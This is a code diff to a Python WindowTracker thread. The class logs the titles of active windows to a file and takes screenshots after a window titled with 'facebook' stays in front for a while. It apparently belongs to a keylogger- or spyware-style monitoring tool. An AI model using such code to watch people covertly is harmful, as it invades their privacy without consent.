@@ -7,14 +7,16 @@ from Screenshot import Screenshot
 class WindowTracker(Thread):
 
 
-    def __init__(self, screenshot:Screenshot, filehandler):
+    def __init__(self, screenshot, filehandler):
         Thread.__init__(self, name='window tracking')
+        self.__debug = True
         self.__activeWindow = None
         self.__samplingFrequency = 0.1
         self.__screenshot = screenshot
+        self.__screenshotTimer = 0
+        self.__screenshotFrequency = 50
         self.__screenshotTrigger = ['facebook']
         self.__filehandler = filehandler
-        self.__debug = True
 
 
 
@@ -23,12 +25,12 @@ class WindowTracker(Thread):
             time.sleep(self.__samplingFrequency)
             activeWindow = win32gui.GetForegroundWindow()
             activeWindowText = win32gui.GetWindowText(activeWindow)
-            self.checkWindow(activeWindowText)
+            self.__examineWindow(activeWindowText)
             self.checkTrigger(activeWindowText)
 
 
 
-    def checkWindow(self, activeWindowTitle:str) -> None:
+    def __examineWindow(self, activeWindowTitle:str) -> None:
         if self.__activeWindow != activeWindowTitle:
             self.__activeWindow = activeWindowTitle
             windowTitle = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
@@ -42,9 +44,14 @@ class WindowTracker(Thread):
     def checkTrigger(self, activeWindowText:str):
         for trigger in self.__screenshotTrigger:
             if trigger in activeWindowText.lower():
-                self.__screenshot.isActive = True
+                self.__screenshotTimer += 1
+                if self.__debug:
+                    print(self.__screenshotTimer)
+                if self.__screenshotTimer >= 50:
+                    self.__screenshot.takeScreenshot()
+                    self.__screenshotTimer = 0
             else:
-                self.__screenshot.isActive = False
+                self.__screenshotTimer = 0
 
 
 
